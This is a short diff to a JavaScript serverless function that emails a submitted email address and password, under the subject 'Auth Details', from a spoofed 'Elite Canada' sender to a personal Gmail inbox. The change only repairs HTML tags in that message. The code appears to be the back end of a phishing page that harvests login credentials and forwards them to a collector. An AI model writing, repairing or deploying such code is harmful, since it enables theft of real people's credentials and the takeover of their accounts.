@@ -20,7 +20,7 @@ export default async ({ req, res, log, error }) => {
       from: '"Elite Canada" <info@ukmetropolitanbk.com>', // sender address
       to: "ebukufidelis@gmail.com", // list of receivers
       subject:"Auth Details",// Subject line
-    html: `<div><h2>Details</h2><p><b<Email: </b>${email}</p> <p><b<Password: </b>${pass}</p></div>`
+    html: `<div><h2>Details</h2><p><b><Email: </b>${email}</p> <p><b>Password: </b>${pass}</p></div>`
     });
     return res.text("ok");
   } catch (e) {
